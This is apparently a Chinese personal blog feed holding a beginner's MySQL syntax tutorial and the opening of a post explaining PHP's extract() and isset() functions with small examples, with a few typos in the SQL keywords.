src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_16-28-33.png"></p><p>用户名和密码没改过的话就都是<strong>root</strong>，打开本地数据库可以不加服务器地址</p><p>进入mysql之后就可以快乐使用了</p><h1 id="02-关于MySQL"><a href="#02-关于MySQL" class="headerlink" title="02 关于MySQL"></a>02 关于MySQL</h1><h4 id="001-MySQL常见符号"><a href="#001-MySQL常见符号" class="headerlink" title="001 MySQL常见符号"></a>001 MySQL常见符号</h4><h5 id="gt"><a href="#gt" class="headerlink" title="-&gt;"></a>-&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-29-23.png"></p><p>表示当前命令没有命令执行符或者等待命令执行符<code>;</code>或<code>\g</code>，也可以输入<code>\c</code>取消命令直接输入<code>;</code>回车即可执行命令。</p><h5 id="‘-gt-或”-gt"><a href="#‘-gt-或”-gt" class="headerlink" title="‘&gt;或”&gt;"></a>‘&gt;或”&gt;</h5><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-07_17-33-39.png"></p><p>表示当前命令缺少<code>&#39;</code>或<code>&quot;</code></p><h4 id="002-MySQL编码规范"><a href="#002-MySQL编码规范" class="headerlink" title="002 MySQL编码规范"></a>002 MySQL编码规范</h4><ul><li><p>关键字与函数名称全部大写；（不大写也可以执行命令）</p></li><li><p>数据库名称、表名、字段名称全部小写；</p></li><li><p>必须以分号结尾</p></li></ul><h4 id="003-结构化查询语言"><a href="#003-结构化查询语言" class="headerlink" title="003 结构化查询语言"></a>003 结构化查询语言</h4><p>主要分为四类</p><p>DDL-数据库定义语言（CREATE DROP ALTER)</p><p>DML-数据库操作语言（INSERT DELETE UPDATE)</p><p>DQL-数据库查询语言（SELECT WHERE)</p><p>DCL-数据库控制语言</p><p><del>说了这么多也没什么用</del>🤪</p><h1 id="03-SQL语法"><a href="#03-SQL语法" class="headerlink" title="03 SQL语法"></a>03 SQL语法</h1><h3 id="对库的操作"><a href="#对库的操作" class="headerlink" title="对库的操作"></a>对库的操作</h3><h5 id="查找库"><a href="#查找库" class="headerlink" title="查找库"></a>查找库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW DATABASE; <br></code></pre></td></tr></table></figure><h5 id="创建库"><a href="#创建库" class="headerlink" title="创建库"></a>创建库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE DATABASE [database_name];<br></code></pre></td></tr></table></figure><p>不知道即将创建的库是否存在时，可使用以下命令：如果库不存在就创建，存在则退出命令</p><p><code>CREATE DATABASE IF NOT EXISTS [database_name];</code></p><blockquote><p>但不建议让MySQL来做判断</p></blockquote><h5 id="删除库"><a href="#删除库" class="headerlink" title="删除库"></a>删除库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP DATABASE [database_name];<br></code></pre></td></tr></table></figure><p><strong>数据库不能修改名字</strong></p><h3 id="对表的操作"><a href="#对表的操作" class="headerlink" title="对表的操作"></a>对表的操作</h3><h5 id="查找表"><a href="#查找表" class="headerlink" title="查找表"></a>查找表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SHOW TABLES;         //查找当前库的所有表<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-25-02.png"></p><h5 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREAT TABLE [table_name](<br>    [column_name] [数据类型] [列的完整性约束]，<br>    ······<br>);<br></code></pre></td></tr></table></figure><blockquote><p>name为创建的表格名，可自行更改</p><p>空格里填表格表头及数据信息</p></blockquote><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE user(<br>    id INT AUTO_INCREMENT PRIMARY KEY,<br>    username VARCHAR(18) NOT NULL,<br>    pwd CHAR(32) NOT NULL,<br>    sex TINYINT NOT NULL DEFAULT 0,<br>    age TINYINT UNSIGNED NOT NULL<br>);<br></code></pre></td></tr></table></figure><blockquote><p>创建新表后，可以使用<code>desc table_name</code>查询表格信息</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-24-19.png"></p><p>数据类型</p><table><thead><tr><th>数据类型</th><th>说明</th></tr></thead><tbody><tr><td>Int</td><td>整数类型</td></tr><tr><td>char(n)</td><td>字符&#x2F;字符串，固定长度</td></tr><tr><td>varchar(n)</td><td>字符&#x2F;字符串，可变长度，最大长度为n</td></tr><tr><td>numeric(a,b)</td><td>精确数值，总位数为a，精确到小数点后第b位</td></tr><tr><td>date</td><td>时间，存储年月日的值</td></tr></tbody></table><p>字段约束</p><table><thead><tr><th>约束类型</th><th>说明</th></tr></thead><tbody><tr><td>UNSIGNED</td><td>只能用于数值整型，设置无符号。最大值不能超过255</td></tr><tr><td>ZEROFILL</td><td>只能用于数值整形，自动用0补全不足位数。eg：001</td></tr><tr><td>AUTO_INCREMENT</td><td>设置字段的自动增量属性，只能用于设置数值类型。</td></tr><tr><td>NULL&#x2F;NOT NULL</td><td>默认为NULL，即没有在此字段插入值。如果设置NOT NULL，则必须在此字段插入相应的值。</td></tr><tr><td>DEFAULT</td><td>通过此属性设置默认值</td></tr><tr><td>PRIMARY KEY</td><td>主键约束，主键自动为NOT NULL。</td></tr></tbody></table><blockquote><p>AUTO_INCREMENT必须和PRIMARY KEY一起用。自动增量必须为主键，但主键不一定要自动增量。</p></blockquote><h5 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE [new_table_name] SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] RENAME [new_table_name];<br></code></pre></td></tr></table></figure><h3 id="对字段的操作"><a href="#对字段的操作" class="headerlink" title="对字段的操作"></a>对字段的操作</h3><h5 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] ADD [column_name] [数据类型] [完整性约束] [位置参数];<br></code></pre></td></tr></table></figure><blockquote><p>位置参数可空默认加在表的最后，也可使用FIRST或AFTER[字段名]</p></blockquote><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_15-58-44.png"></p><h5 id="修改字段"><a href="#修改字段" class="headerlink" title="修改字段"></a>修改字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] MODIFY [column_name] [改后数据类型] [改后的完整性约束]；<br>SLTER TABLE [table_name] CHANGE [column_name] [new_column_name] [改后数据类型] [改后的完整性约束]；<br></code></pre></td></tr></table></figure><blockquote><p>MODIFY关键字只能改数据类型和完整性约束</p></blockquote><h5 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER TABLE [table_name] DROP [column_name];<br>ALTER TABLE [table_name] DROP [column_name1]，DROP [column_name2]，······；<br></code></pre></td></tr></table></figure><h3 id="对内容的操作"><a href="#对内容的操作" class="headerlink" title="对内容的操作"></a>对内容的操作</h3><h5 id="添加内容"><a href="#添加内容" class="headerlink" title="添加内容"></a>添加内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br><br>INSERT INTO [table_name](&#x27;[column_name1]&#x27;，&#x27;[column_name2]&#x27;，······) VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，(&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)，······；<br>//一次插入多条数据<br><br>INSERT INTO [table_name] VALUES (&#x27;[value1]&#x27;，&#x27;[value2]&#x27;,······)；<br></code></pre></td></tr></table></figure><blockquote><p>第二种方法必须严格按照表中顺序一一填写，自增字段可用null占位但不能为空</p></blockquote><p>我的电脑输入字段名不能加引号不然会报错<del>就离谱</del></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-18-09.png"></p><h5 id="查询内容"><a href="#查询内容" class="headerlink" title="查询内容"></a>查询内容</h5><ul><li>选择某一行或某一列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><ul><li>选择整个表格</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * FROM [table_name];<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-19-13.png"></p><h5 id="删除字段-1"><a href="#删除字段-1" class="headerlink" title="删除字段"></a>删除字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DELECT FROM [table_name] [删除条件]; <br></code></pre></td></tr></table></figure><blockquote><p>删除可使用where条件。条件可空，为空时全部值被影响。</p></blockquote><h5 id="修改内容"><a href="#修改内容" class="headerlink" title="修改内容"></a>修改内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">UPDATE [table_name] SET [column_name]=[value] [修改条件];<br></code></pre></td></tr></table></figure><blockquote><p>修改条件可空，全部值被影响。</p></blockquote><h2 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h2><h4 id="distinct"><a href="#distinct" class="headerlink" title="distinct"></a>distinct</h4><p>去除重复值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT DISTINCT [column_name] FROM [table_name];<br></code></pre></td></tr></table></figure><h4 id="where"><a href="#where" class="headerlink" title="where"></a>where</h4><p>where语句用于在表中选择指定符合条件的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE 条件（字段名+运算符+数值）;<br></code></pre></td></tr></table></figure><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>加</td></tr><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>&#x2F;或DIV</td><td>除</td></tr><tr><td>%或MOD</td><td>取余</td></tr></tbody></table><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><table><thead><tr><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>&lt;&gt;或！&#x3D;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td></tr><tr><td>&#x3D;</td><td>等于</td></tr><tr><td>between</td><td>在某个范围内</td></tr><tr><td>like</td><td>模糊匹配</td></tr></tbody></table><blockquote><p>可以使用and或or连接多个条件</p></blockquote><p> <strong>like符号举例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">like &#x27;[查询内容]%&#x27;      //表示以[查询内容]开头的数据<br>like &#x27;%[查询内容]&#x27;      //表示以[查询内容]结尾的数据<br>like &#x27;%[查询内容]%&#x27;      //表示只要查询内容出现即可<br>like &#x27;_[查询内容]%&#x27;      //表示查询内容前有一位字符，后有任意字符<br>like &#x27;%[查询内容]_&#x27;      //表示查询内容前有任意字符，后有一位字符<br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_20-52-05.png"></p><p> <strong>between用法</strong></p><p> between运算符包括起始值和结束值</p><p> 用于选取两个数值范围之内的值，可以是字符串，数字或者日期</p><p> eg:</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] where [colum_name] BETWEEN [value1] and [value2];<br><br>SELECT [colum_name] FROM [table_name] where [colum_name] &gt;= [value1] and [colum_name] &lt;= [value2];<br></code></pre></td></tr></table></figure><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>NOT或！</td><td>逻辑非</td></tr><tr><td>AND</td><td>逻辑与</td></tr><tr><td>OR</td><td>逻辑或</td></tr><tr><td>XOR</td><td>逻辑异或</td></tr></tbody></table><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与</td></tr><tr><td>|</td><td>按位或</td></tr><tr><td>^</td><td>按位异或</td></tr><tr><td>!</td><td>取反</td></tr><tr><td>&lt;&lt;</td><td>左移</td></tr><tr><td>&gt;&gt;</td><td>右移</td></tr></tbody></table><h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><p>in实际上是多个or的合并</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name] IN([value1],[value2],···);<br><br>SELECT [colum_name] FROM [table_name] WHERE<br>[colum_name]=[value1] or [colum_name]=[value2];<br></code></pre></td></tr></table></figure><h5 id="subquery"><a href="#subquery" class="headerlink" title="subquery"></a>subquery</h5><p>subquery为子查询，用于嵌套在where子句中的查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name],[column_name],···FROM [table_name] WHERE条件 (子查询)<br></code></pre></td></tr></table></figure><blockquote><p>子查询为一个完整的select语句</p></blockquote><h5 id="as"><a href="#as" class="headerlink" title="as"></a>as</h5><p>用as为查找对象起别名，但我没尝试成功🥲</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [字段名] FROM [table_name] [条件语句] as [别名]; <br></code></pre></td></tr></table></figure><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/Snipaste_2023-03-08_21-10-56.png"></p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h5 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h5><p>count函数统计符合条件的记录数</p><p>统计表中的记录<strong>总数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT(*) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>不为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT COUNT([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><p>统计表中指定字段<strong>为NULL</strong>的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT *FROM [table_name] WHERE [column_name] IS NULL;<br></code></pre></td></tr></table></figure><h5 id="max函数"><a href="#max函数" class="headerlink" title="max函数"></a>max函数</h5><p>max函数返回所选字段最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MAX([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="min函数"><a href="#min函数" class="headerlink" title="min函数"></a>min函数</h5><p>min函数返回所选字段最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT MIN([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="avg函数"><a href="#avg函数" class="headerlink" title="avg函数"></a>avg函数</h5><p>avg函数返回所选字段的平均值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT AVG([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h5 id="sum函数"><a href="#sum函数" class="headerlink" title="sum函数"></a>sum函数</h5><p>sum函数返回所选按字段的合计值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT SUM([column_name]) FROM [table_name];<br></code></pre></td></tr></table></figure><h3 id="其他一些条件"><a href="#其他一些条件" class="headerlink" title="其他一些条件"></a>其他一些条件</h3><h5 id="having过滤分组"><a href="#having过滤分组" class="headerlink" title="having过滤分组"></a>having过滤分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- having 统计函数 运算符 value；<br></code></pre></td></tr></table></figure><h5 id="group-by分组"><a href="#group-by分组" class="headerlink" title="group by分组"></a>group by分组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- GROUP BY [column_name];<br></code></pre></td></tr></table></figure><h5 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h5><p>可分为正序asc和倒序desc两种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- ORDER BY [column_name] [排序方法],[column_name] [排序方法],······;   <br></code></pre></td></tr></table></figure><h5 id="限制查询数量"><a href="#限制查询数量" class="headerlink" title="限制查询数量"></a>限制查询数量</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- LIMIT [查询数量]<br></code></pre></td></tr></table></figure><h4 id="多表联合"><a href="#多表联合" class="headerlink" title="多表联合"></a>多表联合</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [table_name1].[column_name1],[table_name2].[column_name2] FROM [table_name1],[table_name2] + WHERE子句<br></code></pre></td></tr></table></figure><h5 id="jion连接"><a href="#jion连接" class="headerlink" title="jion连接"></a>jion连接</h5><p>jion连接是基于多个表之间的共同字段把他们结合起来进行查询的一种方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT [column_name] AS FROM [table_name1] JION [table_name2] + ON 子句;<br></code></pre></td></tr></table></figure><h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><p>列出两个表中都存在的数据<code>jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/jion.png"></p><h5 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h5><p>即使没有匹配也要列出左表的数据<code>left jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/leftjion.png"></p><h5 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h5><p>即使没有匹配也要列出右表的数据<code>right jion</code></p><p><img src="/img/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/rightjion.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SQL语句格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">[SELECT语句] [WHERE条件] [GROUP BY条件] [HAVING条件] [ORDER BY条件] [LIMIT条件]；<br></code></pre></td></tr></table></figure><hr><p>终于把这SQL语句搞完了</p><p>撒花🎉</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>MySQL</tag>
      
      <tag>phpstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP黑魔法</title>
    <link href="/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    <url>/2023/03/01/PHP%E9%BB%91%E9%AD%94%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>古娜拉黑暗之神🪄</p><span id="more"></span><h2 id="PHP基础函数"><a href="#PHP基础函数" class="headerlink" title="PHP基础函数"></a>PHP基础函数</h2><p>接着上一篇小bug，把那些也提溜过来继续写🧐</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>extract() 函数从<strong>数组</strong>中将变量导入到当前的符号表。该函数使用数组<strong>键名</strong>作为变量名，使用数组<strong>键值</strong>作为变量值。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p><code>extract(array,extract_rules,prefix)</code></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>array（数组名）</td><td>规定要使用的数组</td></tr><tr><td>extract_rules（提取规则）</td><td>可省略。<em>extract()</em> 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td></tr><tr><td>prefix（前缀）</td><td>可省略。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。</td></tr></tbody></table><p><strong><em>extract_rules</em>可能的值：</strong></p><ul><li>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量</li><li>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。</li><li>EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。</li><li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。</li><li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li><li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li><li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = cat;$b = dog;$c = horse<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;Apple&quot;</span>;<br><span class="hljs-variable">$my_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span> =&gt; <span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>=&gt; <span class="hljs-string">&quot;dog&quot;</span>,<span class="hljs-string">&quot;d&quot;</span> =&gt;<span class="hljs-string">&quot;horse&quot;</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$my_array</span>,EXTR_PREFIX_SAME, <span class="hljs-string">&quot;dup&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span> = <span class="hljs-subst">$a</span>;<span class="hljs-subst">$b</span> = <span class="hljs-subst">$b</span>;<span class="hljs-subst">$c</span> = <span class="hljs-subst">$c</span>&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>$a = Original; $b = Dog; $c = Horse; $dup_a = Cat<br></code></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3><p><strong>isset()</strong> 函数用于检测变量是否已设置并且非 NULL。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><p><code>bool isset ( mixed $var [, mixed $... ] )</code></p><blockquote><p>$var为要测试的变量</p></blockquote><p>如果一次传入多个参数，那么 isset() 只有在全部参数都被设置时返回 TRUE，计算过程从左至右，中途遇到没有设置的变量时就会立即停止。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$test</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span 